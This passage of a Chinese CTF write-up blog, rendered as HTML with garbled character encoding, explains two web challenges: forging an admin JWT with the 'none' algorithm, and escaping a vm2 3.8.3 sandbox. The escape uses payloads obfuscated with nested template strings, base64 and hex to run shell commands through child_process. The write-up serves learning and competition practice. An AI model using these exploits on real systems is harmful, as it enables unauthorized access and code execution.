class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œé‡‡ç”¨äº†NodeJSçš„<code>koa</code>æ¡†æ¶ï¼Œè¯¥æ¡†æ¶çš„ä¸»è¦é€»è¾‘ä»£ç å½“ç„¶ä¹Ÿæ˜¯åœ¨<code>/controllers/api.js</code>ä¸­ï¼Œæœæ–­è¯»å–ã€‚</p><p>è®¿é—®<code>/controllers/api.js</code>æ‹¿åˆ°ä¸»è¦é€»è¾‘ä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">'../rest'</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">'POST /api/register'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'register error'</span>, <span class="string">'wrong username'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(global.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">'hex'</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'POST /api/login'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'username or password is necessary'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/flag'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'permission error'</span>, <span class="string">'permission denied'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">'/flag'</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/logout'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç å¯çŸ¥ï¼Œä¸»è¦åŒ…å«ä¸‰ä¸ªè·¯ç”±ï¼š<code>/api/register</code>è¿›è¡Œæ³¨å†Œã€<code>/api/login</code>è¿›è¡Œç™»å½•ï¼Œ<code>/api/flag</code>è¯»å–flagï¼Œæ¥åˆ†æä¸€ä¸‹ä»£ç é€»è¾‘ã€‚</p><p>é¦–å…ˆæ˜¯<code>register</code>è·¯ç”±ï¼šå®ç°äº†æ³¨å†Œè´¦æˆ·çš„åŠŸèƒ½ï¼Œé€šè¿‡æ¥å—ä¼ å…¥çš„<code>username</code>å’Œ<code>password</code>ï¼Œåˆ¤æ–­<code>username</code>ä¸ä¸º<code>admin</code>ä¹‹åï¼Œéšæœºç”Ÿæˆä¸€ä¸ª<code>secret</code>å¹¶ä¸ºå…¶åˆ†é…ä¸€ä¸ª<code>secretid</code>ä½œä¸ºå…¶åœ¨æ•°ç»„ä¸­çš„ç´¢å¼•ï¼Œç„¶ååˆ©ç”¨<code>secretid</code>ã€<code>username</code>ã€ <code>password</code>ã€<code>secret</code>ä½œä¸ºå†…å®¹é€‰ç”¨<code>HS256</code>è¿›è¡ŒåŠ å¯†ï¼Œç”Ÿæˆä¸€ä¸ªJWTä»¤ç‰Œï¼Œæ­¤æ—¶<code>secret</code>ä¹Ÿå·²ç»å­˜å…¥å…¨å±€æ•°ç»„ã€‚</p><p><code>login</code>è·¯ç”±ï¼šå¯¹usernameæ£€æµ‹ä¹‹åï¼Œå¯¹ç™»å½•çŠ¶æ€çš„tokenè¿›è¡Œäº†æ‹¼æ¥ï¼Œç„¶åä»å…¶ä¸­æå–äº†<code>secretid</code>çš„å€¼ä½œä¸ºç´¢å¼•å»æ•°ç»„ä¸­è¯»å–<code>secret</code>çš„å€¼ï¼Œç”¨è¯¥å€¼å¯¹tokenè¿›è¡ŒéªŒè¯ï¼Œé€šè¿‡éªŒè¯ä¹‹åï¼Œå°†ç™»å½•æ—¶çš„usernameèµ‹å€¼ç»™sessionä¸­çš„usernameã€‚</p><p><code>flag</code>è·¯ç”±ï¼šåˆ¤æ–­usernameä¸ºadminä¹‹åï¼Œå³æ‰“å°flagã€‚</p><p>è‡³æ­¤ï¼Œè§£é¢˜çš„æ€è·¯ä¹Ÿå°±å¾ˆæ˜ç¡®äº†ï¼Œæˆ‘ä»¬é¦–å…ˆåœ¨æ³¨å†Œè´¦æˆ·æ—¶æƒ³åŠæ³•ä¼ªé€ JWTä¸ºadminèº«ä»½ï¼Œç„¶åç”¨adminè´¦æˆ·ç™»å½•ï¼Œå³å¯æ‹¿åˆ°flagã€‚</p><h4 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><h5 id="å…³é”®ç‚¹"><a href="#å…³é”®ç‚¹" class="headerlink" title="å…³é”®ç‚¹"></a>å…³é”®ç‚¹</h5><p>å…³é”®ç‚¹å°±åœ¨äºå¦‚ä½•ä¼ªé€ JWTï¼Œä»£ç ä¸­ç”ŸæˆJWTä»¤ç‰Œæ—¶é‡‡ç”¨çš„æ—¶<code>HS256</code>ç®—æ³•ï¼Œå¹¶ä¸”<code>secret</code>æ—¶éšæœºç”Ÿæˆå¹¶å­˜å…¥æ•°ç»„ä¸­çš„ï¼Œçˆ†ç ´æ€•æ˜¯å¾ˆéš¾çˆ†ç ´å‡ºæ¥ï¼Œé‚£å°±è¦æƒ³åˆ«çš„åŠæ³•ã€‚è¿™é‡Œç”¨åˆ°çš„æ–¹æ³•æ˜¯åˆ©ç”¨<code>none</code>åŠ å¯†ç®—æ³•æ¥ä¼ªé€ ï¼ŒåŸç†å¦‚ä¸‹ï¼š</p><blockquote><p>å½“åŠ å¯†æ—¶ä½¿ç”¨çš„æ˜¯<code>none</code>ç®—æ³•ï¼Œå¹¶ä¸”ç§˜é’¥çš„å€¼ä¸º<code>undefined</code>æˆ–ç©ºçš„æ—¶å€™ï¼Œåœ¨éªŒè¯æ—¶ï¼Œå³ä¾¿åé¢çš„ç®—æ³•è®¾ç½®ä¸º <code>HS256</code>ï¼ŒéªŒè¯ä¹Ÿè¿˜æ˜¯æŒ‰ç…§<code>none</code>æ¥è¿›è¡Œå¹¶ä¸”é€šè¿‡éªŒè¯ã€‚</p><p>é€ æˆè¿™ä¸ªæ¼æ´çš„åŸå› åœ¨äºï¼šè¿™é‡ŒéªŒè¯çš„æ—¶å€™optionsé€‰ç”¨çš„æ˜¯<code>algorithm</code>ï¼Œè€Œä¾èµ–åº“ä¸­æ­£ç¡®çš„æ˜¯<code>algorithms</code>ï¼Œæ­£æ˜¯è¿™ä¸ªåŸå› é€ æˆäº†ä¸Šé¢çš„æ¼æ´ã€‚</p></blockquote><p>æˆ‘ä»¬çŸ¥é“ï¼Œè¿™ä¸ªé¢˜ä¸­åœ¨éªŒè¯tokençš„æ—¶å€™ï¼Œé€‰ç”¨äº†<code>HS256</code>ç®—æ³•å¯¹<code>(token, secret)</code>è¿›è¡Œäº†éªŒè¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚æœåˆ©ç”¨ä¸Šé¢çš„æ–¹æ³•å»ä¼ªé€ ä¸€ä¸ªç”¨æˆ·åä¸º<code>admin</code>ã€secretä¸ºç©ºçš„JWTï¼Œé‚£åº”è¯¥å°±èƒ½ä¼ªé€ æˆadminèº«ä»½è¯»å–åˆ°flagäº†ï¼Œä¸è¿‡è¿˜æœ‰ä¸ªé—®é¢˜ï¼š</p><p>æˆ‘ä»¬ä¼ªé€ çš„JWTä¸­çš„<code>secretid</code>è¦æ»¡è¶³<code>sid !== undefined</code>ã€<code>sid !== null</code>ã€<code>(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0) == true</code></p><p>é‚£ä¹ˆå°±å¯¹æˆ‘ä»¬ä¼ªé€ JWTæ—¶çš„secretidæå‡ºäº†è¾ƒå¤§çš„è°ƒæ•´ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œæˆ‘ä»¬å‰é¢ä¸æ˜¯æåˆ°äº†JSçš„å¼±ç±»å‹äº†å˜›ï¼Œå…¶å®æˆ‘ä»¬ä¼ ä¸€ä¸ªç©ºæ•°ç»„<code>[]</code>ã€ä¼ ä¸€ä¸ªæµ®ç‚¹æ•°<code>0.1</code>ç­‰ç­‰è¿™äº›éƒ½æ˜¯å¯ä»¥çš„å•Šï¼Œç©ºå£æ— å‡­ï¼Œè®©æˆ‘ä»¬å®è·µå‡ºçœŸçŸ¥ã€‚</p><h5 id="å®æ“"><a href="#å®æ“" class="headerlink" title="å®æ“"></a>å®æ“</h5><p>è®¿é—®<code>register</code>è¿›è¡Œæ³¨å†Œï¼Œè¿”å›äº†ä¸€ä¸ª<code>JWT</code>ä»¤ç‰Œï¼Œè§£ç çœ‹å…¶ä¸­çœ‹å…¶ä¸­å†…å®¹ï¼š</p><p><img src="http://ggb0n.cool/images/hfctf.png" alt=""></p><p>å—¯â€¦æ²¡æ¯›ç—…ï¼Œè®©æˆ‘ä»¬æ¥ä¼ªé€ JWTå§ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;<span class="string">"secretid"</span>:[],<span class="string">"username"</span>: <span class="string">"admin"</span>,<span class="string">"password"</span>: <span class="string">"admin"</span>,<span class="string">"iat"</span>: <span class="number">1587472023</span>&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¼ªé€ çš„JWTï¼š</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3NDcyMDIzfQ.</span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿ç€æˆ‘ä»¬çš„ä»¤ç‰Œå»ç™»å½•ï¼Œç™»å½•æ—¶åœ¨<code>authorization</code>å¡«å…¥ä¼ªé€ çš„JWTï¼Œæ³¨æ„ç™»é™†çš„<code>username</code>å’Œ<code>password</code>è¦ä¸ä¼ªé€ çš„JWTé‡Œçš„ä¸€æ ·ï¼ˆè¿™é‡Œæˆ‘ä»¬å‰é¢æ˜¯å·²ç»ç”¨<code>test/test</code>è¿›è¡Œæ³¨å†Œäº†ï¼Œä¹Ÿå°±æ˜¯è¯´å·²ç»åˆå§‹åŒ–äº†<code>secrets</code>æ•°ç»„ï¼Œè¿™æ ·ä¹Ÿæ›´ä¸ä¼šé€ æˆé€»è¾‘ä¸Šçš„é—®é¢˜ï¼‰</p><p><img src="http://ggb0n.cool/images/hfctf1.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶çš„<code>status</code>ä¸º<code>true</code>ï¼Œè®°ä¸‹æ­¤æ—¶çš„<code>sses:aok</code>å’Œ<code>sses:aok.sig</code>ï¼Œè¿™ä¸ªsessionä¸­çš„usernameå€¼å…¶å®å·²ç»èµ‹å€¼ä¸ºadminäº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªsessionæ˜¯adminç™»å½•çš„sessionï¼Œæ‹¿ç€å®ƒå°±å¯ä»¥è¯»å–flagã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬å»è®¿é—®<code>/api/flag</code>è·¯ç”±ï¼Œå°†è®°å½•ä¸‹çš„tokenè¿›è¡Œæ›¿æ¢ï¼Œå³å¯ä¼ªé€ ä¸ºadminèº«ä»½æ‹¿åˆ°flagï¼š</p><p><img src="http://ggb0n.cool/images/hfctf2.png" alt=""></p><p>æ‹¿åˆ°flagï¼Œæ’’èŠ±~</p><h3 id="JustEscape"><a href="#JustEscape" class="headerlink" title="JustEscape"></a>JustEscape</h3><p>è€ƒå¯Ÿ<code>vm2æ²™ç®±é€ƒé€¸</code>ã€<code>JSæ¨¡æ¿å­—ç¬¦ä¸²</code>ä»¥åŠå¯¹å­—ç¬¦ä¸²è¿‡æ»¤çš„é›†ä¸­ç»•è¿‡æ–¹å¼</p><h4 id="çŸ¥è¯†è¡¥å……-1"><a href="#çŸ¥è¯†è¡¥å……-1" class="headerlink" title="çŸ¥è¯†è¡¥å……"></a>çŸ¥è¯†è¡¥å……</h4><p>JSæ¨¡æ¿å­—ç¬¦ä¸²ï¼š</p><blockquote><p>æ¨¡æ¿å­—ç¬¦ä¸²ä½¿ç”¨åå¼•å·` æ¥ä»£æ›¿æ™®é€šå­—ç¬¦ä¸²ä¸­çš„ç”¨åŒå¼•å·å’Œå•å¼•å·ã€‚æ¨¡æ¿å­—ç¬¦ä¸²å¯ä»¥åŒ…å«ç‰¹å®šè¯­æ³•ï¼ˆ<code>&#39;${expression}&#39;</code>æ³¨æ„æ˜¯å•å¼•å·ï¼‰çš„å ä½ç¬¦ã€‚å ä½ç¬¦ä¸­çš„è¡¨è¾¾å¼å’Œå‘¨å›´çš„æ–‡æœ¬ä¼šä¸€èµ·ä¼ é€’ç»™ä¸€ä¸ªé»˜è®¤å‡½æ•°ï¼Œè¯¥å‡½æ•°è´Ÿè´£å°†æ‰€æœ‰çš„éƒ¨åˆ†è¿æ¥èµ·æ¥ï¼Œå¦‚æœä¸€ä¸ªæ¨¡æ¿å­—ç¬¦ä¸²ç”±è¡¨è¾¾å¼å¼€å¤´ï¼Œåˆ™è¯¥å­—ç¬¦ä¸²è¢«ç§°ä¸ºå¸¦æ ‡ç­¾çš„æ¨¡æ¿å­—ç¬¦ä¸²ï¼Œè¯¥è¡¨è¾¾å¼é€šå¸¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒä¼šåœ¨æ¨¡æ¿å­—ç¬¦ä¸²å¤„ç†åè¢«è°ƒç”¨ï¼Œåœ¨è¾“å‡ºæœ€ç»ˆç»“æœå‰ï¼Œä½ éƒ½å¯ä»¥é€šè¿‡è¯¥å‡½æ•°æ¥å¯¹æ¨¡æ¿å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œå¤„ç†ã€‚åœ¨æ¨¡ç‰ˆå­—ç¬¦ä¸²å†…ä½¿ç”¨åå¼•å·æ—¶ï¼Œéœ€è¦åœ¨å®ƒå‰é¢åŠ è½¬ä¹‰ç¬¦ï¼ˆ\ï¼‰ã€‚</p></blockquote><h4 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>æ ¹æ®é¢˜ç›®çš„æç¤ºï¼Œå¯ä»¥æ‰§è¡Œä¸€äº›ä»£ç ï¼Œè¿™æ ·çš„è¯å²‚ä¸æ˜¯ç›´æ¥<code>eval</code>å°±è¡Œäº†ï¼Ÿä½†æ˜¯é¢˜ç›®æç¤º<code>çœŸçš„æ˜¯PHPå˜›</code>ï¼Œemmmâ€¦å‡çš„å§ï¼Œè¿™é‡Œå­¦åˆ°éªšå§¿åŠ¿ï¼Œç”¨<code>Error().stack</code>è¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œæ¥çœ‹åç«¯é‡‡ç”¨çš„æ¶æ„ï¼š</p><p><img src="http://ggb0n.cool/images/hfctf3.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°åç«¯æ˜¯ä¸€ä¸ªJSçš„<code>VM2</code>æ²™ç®±ï¼Œè¿›ä¸€æ­¥æµ‹è¯•å‘ç°<code>&#39; &quot; +</code>éƒ½è¢«banæ‰äº†ï¼Œä¸è¿‡åˆ©ç”¨ç°æœ‰çš„é€ƒé€¸æ–¹æ³•å³å¯è¿›è¡Œé€ƒé€¸ï¼š<a href="https://github.com/patriksimek/vm2/issues/225">VM2(3.8.3)é€ƒé€¸exp</a></p><p>ä½†æ˜¯é™¤äº†å‰é¢æåˆ°çš„è¢«bançš„å­—ç¬¦å¤–ï¼Œå¾ˆå¤šå‡½æ•°ï¼Œæ¯”å¦‚ï¼š<code>process</code>ã€<code>exec</code>ã€<code>eval</code>ç­‰ä¹Ÿéƒ½è¢«è¿‡æ»¤äº†ï¼Œè§¦å‘é»‘åå•å°±ä¼šèµ é€ä¸€ä¸ªé”®ç›˜ï¼š</p><p><img src="http://ggb0n.cool/images/hfctf4.png" alt=""></p><p>è¿™é‡Œå¯ä»¥é€šè¿‡åˆ©ç”¨<code>å­—ç¬¦ä¸²æ‹¼æ¥</code>å’Œ<code>æ•°ç»„è°ƒç”¨</code>ï¼ˆå¯¹è±¡çš„æ–¹æ³•æˆ–è€…å±æ€§åå…³é”®å­—è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹å¯ä»¥æŠŠå¯¹è±¡å½“æˆä¸€ä¸ªæ•°ç»„ï¼Œç„¶åæ•°ç»„é‡Œé¢çš„é”®åç”¨å­—ç¬¦ä¸²æ‹¼æ¥å‡ºæ¥ï¼‰çš„æ–¹å¼æ¥ç»•è¿‡å…³é”®å­—çš„é™åˆ¶ï¼Œä½†æ˜¯è¿™é‡Œå•ã€åŒå¼•å·éƒ½è¢«banäº†ï¼Œç›´æ¥è¿›è¡Œå­—ç¬¦ä¸²çš„æ‹¼æ¥è‚¯å®šæ˜¯ä¸è¡Œï¼Œä¸è¿‡å¯ä»¥åˆ©ç”¨<code>åå¼•å·</code>æ¥ä»£æ›¿å•å¼•å·ï¼ŒåŒæ—¶åˆ©ç”¨<code>æ¨¡æ¿å­—ç¬¦ä¸²åµŒå¥—</code>æ¥æ‹¼æ¥å‡ºéœ€è¦çš„å­—ç¬¦ä¸²ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`proces`</span>&#125;</span>s`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure><p>è¾“å‡º<code>process</code></p><p>åˆ©ç”¨æ­¤æ–¹æ³•å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥å³å¯ç»•è¿‡è¿‡æ»¤ï¼Œå¯¹å‰é¢æåˆ°çš„expè¿›è¡Œæ”¹è¿›å³å¯æˆåŠŸé€ƒé€¸ã€‚</p><p>å¦ä¸€ç§ç»•è¿‡æ–¹æ³•æ˜¯åˆ©ç”¨<code>base64</code>ã€<code>hex</code>ç¼–ç è¿›è¡Œç»•è¿‡ï¼Œä¸è¿‡éƒ½æ˜¯åœ¨ä¸Šé¢çš„é€ƒé€¸expåŸºç¡€ä¸Šç¼–ç è¿›è¡Œè¿›ä¸€æ­¥ç»•è¿‡çš„æ–¹æ³•ã€‚</p><h4 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p><strong>æ–¹æ³•ä¸€ï¼šåˆ©ç”¨æ¨¡æ¿å­—ç¬¦ä¸²åµŒå¥—ç»•è¿‡</strong></p><p>æ”¹è¿›çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>ç›´æ¥å°†ä¸Šé¢çš„payloadå¡«å…¥hackbarçš„URLæ æ‰§è¡Œå³å¯ï¼š</p><p><img src="http://ggb0n.cool/images/hfctf5.png" alt=""></p><p><strong>æ–¹æ³•äºŒï¼šåˆ©ç”¨base64/hexç¼–ç ç»•è¿‡</strong></p><p>é¦–å…ˆè´´ä¸€ä¸‹é€ƒé€¸çš„expï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span> =&gt;</span> f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">""</span>)).a = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    e.get_process(<span class="function"><span class="params">()</span> =&gt;</span> &#123; &#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"cat /flag"</span>).toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹å‰é¢çš„expè¿›è¡Œç¼–ç ï¼Œè¿›ä¸€æ­¥ç»•è¿‡è¿‡æ»¤</p><p>base64ç¼–ç payloadï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">global[[<span class="string">`eva`</span>,%<span class="number">20</span><span class="string">`l`</span>].join(<span class="string">``</span>)](Buffer.from(<span class="string">`VHlwZUVycm9yLnByb3RvdHlwZS5nZXRfcHJvY2VzcyA9IGYgPT4gZi5jb25zdHJ1Y3RvcigicmV0dXJuIHByb2Nlc3MiKSgpOwp0cnkgewogICAgT2JqZWN0LnByZXZlbnRFeHRlbnNpb25zKEJ1ZmZlci5mcm9tKCIiKSkuYSA9IDE7Cn0gY2F0Y2ggKGUpIHsKICAgIGUuZ2V0X3Byb2Nlc3MoKCkgPT4geyB9KS5tYWluTW9kdWxlLnJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjU3luYygiY2F0IC9mbGFnIikudG9TdHJpbmcoKTsKfQ==`</span>,%<span class="number">20</span><span class="string">`base64`</span>).toString(<span class="string">`ascii`</span>));</span><br></pre></td></tr></table></figure><p>hexç¼–ç payloadï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">TypeError</span>[<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>)][<span class="string">`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72`</span>](<span class="string">`\x72\x65\x74\x75\x72\x6e\x20\x70\x72\x6f\x63\x65\x73\x73`</span>)();<span class="keyword">try</span>&#123;<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> e[<span class="string">`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require((<span class="string">`\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>))[<span class="string">`\x65\x78\x65\x63\x53\x79\x6e\x63`</span>](<span class="string">`cat /flag`</span>).toString();&#125;&#125;)()</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœï¼š</p><p><img src="http://ggb0n.cool/images/hfctf6.png" alt=""></p><h3 id="å°ç»“ä¸€ä¸‹"><a href="#å°ç»“ä¸€ä¸‹" class="headerlink" title="å°ç»“ä¸€ä¸‹"></a>å°ç»“ä¸€ä¸‹</h3><p>è¿™ä¸¤é“é¢˜å¯¹é€æ­¥å­¦ä¹ JSè¿˜æ˜¯å¾ˆæœ‰ç”¨æ»´ï¼Œä¸è¿‡ä¹Ÿææ…Œäº†ï¼Œæ„Ÿè§‰åˆå•¥ä¹Ÿä¸ä¼šäº†ğŸ˜…</p><p>å‚è€ƒï¼š<br><a href="https://www.zhaoj.in/read-6512.html">èµµå¸ˆå‚…çš„è¶…è¯¦ç»†é¢˜è§£</a><br><a href="https://github.com/patriksimek/vm2/issues/225">VM2(3.8.3)é€ƒé€¸exp</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings">JSæ¨¡æ¿å­—ç¬¦ä¸²åµŒå¥—</a></p>]]></content>
    
    <summary type="html">
    
